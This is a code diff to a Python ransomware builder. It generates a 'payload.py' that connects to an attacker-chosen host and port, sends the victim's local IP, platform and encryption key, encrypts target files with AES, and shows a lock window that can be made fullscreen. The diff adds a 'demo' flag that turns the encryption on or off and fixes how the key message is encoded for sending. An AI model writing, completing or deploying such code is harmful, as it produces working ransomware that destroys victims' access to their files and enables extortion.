@@ -1,13 +1,13 @@
 import re
 
-def create_demon(host, port, fullscreen):
+def create_demon(host, port, fullscreen, demo, ghost):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time
 from tkinter import *
 from tkinter.ttk import *
 
-from Crypto import Random
-from Crypto.Cipher import AES
+<import_random>
+<import_aes>
 
 class mainwindow(Tk):
     def __init__(self):
@@ -272,16 +272,17 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        server.send('%s$%s$%s' % (getlocalip(), platform, key))
+        msg = '%s$%s$%s' % (getlocalip(), platform, key)
+        server.send(msg.encode('utf-8'))
 
-        #start_encrypt(get_target(), key)
+        <encrypt>
 
         main = mainwindow()
         main.mainloop()
 
     except Exception as e:
         # Do not send key, encrypt anyway.
-        #start_encrypt(get_target(), key)
+        <encrypt>
         main = mainwindow()
         main.mainloop()
 
@@ -296,12 +297,23 @@ except KeyboardInterrupt:
     demon = demon.replace("<host>", host)
     demon = demon.replace('<port>', str(port))
 
-    if fullscreen == '1':
+    if fullscreen == 1:
         # Insert fullscreen code
         demon = demon.replace('<fullscreen>', 'self.geometry("{0}x{1}+0+0".format(self.winfo_screenwidth(), self.winfo_screenheight()))')
-    else:
+    elif fullscreen == 0:
         # Replace setting with empty string
         demon = demon.replace('<fullscreen>', '')
+
+    if demo == 1:
+        # Disable encrypting
+        demon = demon.replace('<encrypt>', '#start_encrypt(get_target(), key)')
+        demon = demon.replace('<import_random>', '')
+        demon = demon.replace('<import_aes>', '')
+    elif demo == 0:
+        # Enable Encrypting
+        demon = demon.replace('<encrypt>', 'start_encrypt(get_target(), key)')
+        demon = demon.replace('<import_random>', 'from Crypto import Random')
+        demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
 
     with open('./payload.py', 'w') as f:
         f.write(demon)
